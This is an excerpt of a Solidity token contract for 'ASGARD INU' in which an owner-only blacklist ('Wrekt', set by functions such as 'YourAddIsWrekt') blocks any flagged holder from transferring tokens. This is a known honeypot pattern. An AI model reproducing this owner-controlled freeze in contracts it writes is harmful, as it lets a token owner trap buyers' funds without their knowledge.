...
contract ASGARDIAN is Context, IERC20, Ownable {
    ...
    mapping (address => bool) public Wrekt;
    ...
    address public marketingWallet = 0x56dFc8aA10a9875F814739c26D6B6b844D527574;

    string private constant _name = "ASGARD INU";
    string private constant _symbol = "ASGARDIAN";
    ...
    function YourAddIsWrekt(address account, bool TorF) public onlyOwner {
        Wrekt[account] = TorF;
    }

    function AllOfYourAddIsWrekt(address[] memory account, bool TorF) public onlyOwner {
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        require(!Wrekt[to] && !Wrekt[from], "Sorry, You can't transfer your token!");
